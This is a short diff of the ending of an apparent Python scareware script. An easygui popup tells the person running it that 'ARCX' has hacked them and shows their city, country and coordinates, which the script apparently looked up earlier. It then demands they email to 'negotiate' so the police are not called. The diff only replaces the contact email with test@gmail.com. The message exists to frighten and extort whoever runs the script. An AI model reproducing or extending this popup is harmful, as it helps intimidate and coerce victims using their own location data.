@@ -36,5 +36,5 @@ g=(location['subdivisions'][0]['names']['en'])
      
 if __name__=='__main__':
     start()
-    easygui.msgbox("Hello There! My name is ARCX and you have been hacked due to your misdeeds and I have acquired your information" + "\n " + "\nYour City:" + str(a) + "\nYour Country:"+ str(c) + "\nLongitude:" + str(d["longitude"]) +"\nLatitude:" +  str(d['latitude']) +'\n' + '\n Contact email above to negotiate with me so i do not call the police on you' , title="EMAIL: ryanchamruiyang@gmail.com")
+    easygui.msgbox("Hello There! My name is ARCX and you have been hacked due to your misdeeds and I have acquired your information" + "\n " + "\nYour City:" + str(a) + "\nYour Country:"+ str(c) + "\nLongitude:" + str(d["longitude"]) +"\nLatitude:" +  str(d['latitude']) +'\n' + '\n Contact email above to negotiate with me so i do not call the police on you' , title="EMAIL: test@gmail.com")
 
